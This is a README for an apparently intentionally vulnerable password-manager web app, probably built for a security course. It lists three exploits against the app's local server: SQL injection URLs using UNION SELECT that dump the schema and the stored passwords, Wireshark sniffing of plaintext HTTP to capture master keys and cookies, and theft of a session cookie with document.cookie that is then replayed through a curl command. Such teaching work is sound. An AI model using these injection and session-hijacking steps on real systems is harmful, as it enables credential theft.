# PasswordManager
Before running this application, set the hostname variable to your host ip address. 

#### Run the app with:
    python3 backend.py

### Exploit 1: SQL Injection
1. Create an account, log in, and save a password for some website.
2. Then enter the following urls.
3. http://127.0.0.1:5000/get_password/google'%20UNION%20ALL%20SELECT%20sql%20from%20sqlite_master;-- which gives all schema for database
4. http://127.0.0.1:5000/get_password/google'%20UNION%20ALL%20SELECT%website%20from%20password_table;-- for all websites with passwords stored
5. http://127.0.0.1:5000/get_password/google'%20UNION%20ALL%20SELECT%20password%20from%20password_table;-- for the corresponding passwords

### Exploit 2: Intercepting HTTP Requests
1. Download WireShark
2. Make sure you are on the same WiFi as targetted client (targetted client must be on a different device)
3. Open WireShark and filter by HTTP
4. Monitor user activity by observing HTTP Requests and Responses
5. Obtain information (master key, passwords, cookies)
### Exploit 3: Cookie Retrieval With JavaScript and Spoofing
1. Obtain a device that another user used to sign in to their password manager account (we assume that cookies were used by advertisements during their session)
   
    a. To simulate an ad using their cookies (because we did not want to get ads involved), before the previous user logs out, do Steps 2 and 3

2. Open developer tools and navigate to the console tab
3. Run the ```document.cookie ``` JavaScript function to view cookie information
4. Copy the cookie
5. Send an HTTP GET request to the server using the following command to obtain the password for the specified website. (Note that the previous user must have a password for that website stored in the database)
#
    curl --header "Cookie: session=<place cookie here>" --header "Host: <place host ip address and port number>" --header "Referer: <place host ip address and port number>/get_password" <place host ip address and port number>/get_password/<website>    
    
